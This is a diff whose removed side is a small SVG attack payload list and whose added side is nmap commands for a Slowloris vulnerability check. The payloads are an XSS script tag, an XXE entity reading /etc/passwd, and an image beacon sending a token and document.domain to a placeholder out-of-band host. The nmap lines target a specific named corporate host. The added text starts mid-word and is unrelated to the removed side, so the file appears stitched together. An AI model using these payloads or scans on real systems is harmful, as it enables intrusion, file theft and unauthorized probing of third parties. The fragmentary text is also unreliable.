@@ -1,22 +1,13 @@
-<?xml version="1.0"?>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script>alert('XSS')</script>
-</svg>
+o run only the Slowloris NSE script (instead of the entire vuln category), use:
 
-<svg xmlns="http://www.w3.org/2000/svg">
-  <image xlink:href="data:image/svg+xml;base64,PHNvZnQ+PC9zb2Z0Pg=="/>
-</svg>
+nmap -Pn -sV -p 6165 --script http-slowloris-check iapp192625.heathrow.ms.com
 
+Or save the output to a file:
 
-<?xml version="1.0"?>
-<!DOCTYPE root [
-  <!ENTITY ext SYSTEM "file:///etc/passwd">
-]>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <text>&ext;</text>
-</svg>
+nmap -Pn -sV -p 6165 --script http-slowloris-check -oN slowloris.txt iapp192625.heathrow.ms.com
+Increase verbosity (shows more details)
+nmap -Pn -sV -p 6165 --script http-slowloris-check -d iapp192625.heathrow.ms.com
 
+or
 
-<svg xmlns="http://www.w3.org/2000/svg">
-  <image xlink:href="http://{{OOB_DOMAIN}}/collect?u={{TOKEN}}&d=document.domain" width="1" height="1"/>
-</svg>
+nmap -Pn -sV -p 6165 --script http-slowloris-check -vv iapp192625.heathrow.ms.com
